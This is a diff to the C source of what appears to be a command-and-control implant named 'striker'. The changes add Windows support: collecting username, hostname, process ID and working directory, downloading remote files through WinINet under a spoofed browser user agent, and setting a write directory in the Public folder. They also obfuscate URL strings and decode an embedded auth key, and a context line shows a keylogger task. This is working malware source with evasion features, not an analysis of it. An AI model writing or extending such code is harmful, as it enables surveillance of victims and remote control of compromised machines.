@@ -8,7 +8,7 @@
 #include "striker.h"
 
 // Controls debug output
-#define STRIKER_DEBUG
+// #define STRIKER_DEBUG
 // Size of agent UID
 #define AGENT_UID_SIZE 17
 // Max task result size in bytes
@@ -60,11 +60,14 @@ char *obfs_decode(char *str){
 
 void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path){
   
+  char strs[][20] = {"[OBFS_ENC]http://", "[OBFS_ENC]https://"};
+  for (int i = 0; i < 2; i++)
+    obfs_decode(strs[i]);
   *proto = HTTP;
-  if (!(strncmp("http://", url, 7))){
+  if (!(strncmp(strs[0], url, 7))){
     *port = 80;
     url += 7;
-  }else if (!(strncmp("https://", url, 8))){
+  }else if (!(strncmp(strs[1], url, 8))){
     *proto = HTTPS;
     *port = 443;
     url += 8;
@@ -270,25 +273,34 @@ int http_post(char *url, cJSON *data, buffer *body){
 
 cJSON *sysinfo(){
 
-  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host"};
-  for (int i = 0; i < 7; i++)
+  char strs[][30] = {"[OBFS_ENC]USER", "[OBFS_ENC]linux", "[OBFS_ENC]user", "[OBFS_ENC]pid", "[OBFS_ENC]cwd", "[OBFS_ENC]os", "[OBFS_ENC]host", "[OBFS_ENC]windows", "[OBFS_ENC]USERNAME"};
+  for (int i = 0; i < 9; i++)
     obfs_decode(strs[i]);
   cJSON *info = cJSON_CreateObject();
+  unsigned short pid = getpid();
+  char *cwd = malloc(PATH_MAX);
+  getcwd(cwd, PATH_MAX);
+  cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
+  cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
   #ifdef IS_LINUX
-    char *user = getenv(strs[0]);
-    unsigned short pid = getpid();
-    char *cwd = malloc(PATH_MAX);
-    getcwd(cwd, PATH_MAX);
     char *host = malloc(100);
+    char *user = getenv(strs[0]);
     gethostname(host, 99);
     cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
-    cJSON_AddItemToObject(info, strs[3], cJSON_CreateNumber(pid));
-    cJSON_AddItemToObject(info, strs[4], cJSON_CreateString(cwd));
     cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[1]));
     cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));
-    free(cwd);
+    free(host);
+  #else
+    char *user = getenv(strs[8]);
+    DWORD size = 1024;
+    LPSTR host = malloc(size);
+    GetComputerNameExA(ComputerNameDnsFullyQualified, host, &size);
+    cJSON_AddItemToObject(info, strs[2], cJSON_CreateString(user));
+    cJSON_AddItemToObject(info, strs[5], cJSON_CreateString(strs[7]));
+    cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(host));    
     free(host);
   #endif
+  free(cwd);
   return info;
 }
 
@@ -347,7 +359,31 @@ short int download_file(char *url, FILE *wfo, buffer *result_buff){
     char msg[] = "[OBFS_ENC]File uploaded successfully!";
     buffer_strcpy(result_buff, obfs_decode(msg));
   #else
-    buffer_strcpy(result_buff, "Coming soon on windows...");
+    char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
+    int urlLen = strlen(url);
+    wchar_t wcUrl[urlLen+1];
+    mbstowcs(wcUrl, url, urlLen + 1);
+    HINTERNET hInternet = InternetOpen(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hResponse = InternetOpenUrlW(hInternet, wcUrl, L"", 0, 0, 0);
+    if (!hResponse){
+      InternetCloseHandle(hInternet);
+      return 0;
+    }
+    DWORD dwStatusCode;
+    DWORD dwHeaderSize = sizeof(DWORD);
+    HttpQueryInfo(hResponse, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatusCode, &dwHeaderSize, NULL);
+    DWORD dwBlockSize = 1024;
+    DWORD dwBytesRead;
+    char *buff = malloc(dwBlockSize);
+    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
+      if (!dwBytesRead)
+        break;
+      fwrite(buff, 1, dwBytesRead, wfo);
+    }
+    free(buff);
+    InternetCloseHandle(hResponse);
+    InternetCloseHandle(hInternet);
+    return dwStatusCode;
   #endif
   return 1;
 }
@@ -678,11 +714,15 @@ DWORD WINAPI task_executor(LPVOID ptr)
       obfs_decode(strs[i]);
     char *dir = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
     int len = strlen(dir);
-    if (dir[len - 1] != '/'){
-      dir[len] = '/';
-      dir[len + 1] = '\0';
-    }
     strncpy(striker->write_dir, dir, PATH_MAX);
+    if (dir[len - 1] != '/' && dir[len - 1] != '\\'){
+      #ifdef IS_LINUX
+      striker->write_dir[len] = '/';
+      #else
+      striker->write_dir[len] = '\\';
+      #endif
+      striker->write_dir[len + 1] = '\0';
+    }
     buffer_strcpy(result_buff, strs[1]);
   }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
     keymon(striker, tsk);
@@ -741,13 +781,22 @@ void start_session(){
   session *striker = malloc(sizeof(session));
   striker->uid = malloc(AGENT_UID_SIZE);
   memset(striker->uid, 0, AGENT_UID_SIZE);
+  obfs_decode(AUTH_KEY);
   striker->auth_key = malloc(strlen(AUTH_KEY));
   strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY));
   striker->delay = atoi(DELAY);
   if (striker->delay == 0)
     striker->delay = 10;
   striker->write_dir = malloc(PATH_MAX);
+  #ifdef IS_LINUX
   strncpy(striker->write_dir, strs[0], PATH_MAX);
+  #else
+  char *publicDir = getenv("PUBLIC");
+  strncpy(striker->write_dir, publicDir, strlen(publicDir) + 2);
+  striker->write_dir[strlen(publicDir)] = '\\';
+  striker->write_dir[strlen(publicDir) + 1] = '\0';
+  free(publicDir);
+  #endif
   striker->abort = 0;
   char *tmp;
 
